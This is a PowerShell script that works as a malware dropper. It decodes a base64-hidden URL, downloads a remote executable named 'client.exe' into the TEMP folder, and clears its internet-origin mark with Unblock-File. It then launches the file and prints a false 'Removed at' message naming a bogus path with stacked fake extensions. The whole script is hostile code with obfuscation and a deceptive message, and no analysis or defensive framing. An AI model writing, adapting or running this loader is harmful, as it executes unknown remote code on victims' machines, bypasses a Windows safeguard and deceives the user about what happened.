$encoded_url = "aHR0cHM6Ly9jZG4uc3RvcmFnZS50by9kZDJjMzQzMi00NDY4LTQyNjgtODY3Ni0xZjkzNDRkMjkyMjY/ZXhwaXJlcz0xNzc4NjIyNTgwJmZpbGVuYW1lPWNsaWVudC5leGUmaWQ9SUNPRkFQYUxCJnNpZz0zYmIxNTliYjQ0ZmUwOTRjODNiY2UxZDJkMDk5MTEwNDM3ZmJhMzgyNDA0ODFlZTJlYjViN2MyMTEyMGE5N2I2"

$url = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String($encoded_url)
)

$path = Join-Path $env:TEMP "client.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    Invoke-WebRequest `
        -Uri $url `
        -OutFile $path `
        -UseBasicParsing

    if (Test-Path $path) {
        Unblock-File $path
        Start-Process -FilePath $path
        Write-Host "Removed at C:\PUBLIC\Documents\x9z5LCh94mR4L4c49jtm5p9jJLr4mbv9c0x492598918ITKgl9CVJl4kG4m4f9xP4L4m55J4mncq899go53n59Vxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.gif.jpg.png.png.png.png.exe.pdf.exe" -ForegroundColor Green
    }
    else {
        Write-Host "Failed." -ForegroundColor Red
    }
}
catch {
    Write-Host $_.Exception.Message -ForegroundColor Red
}
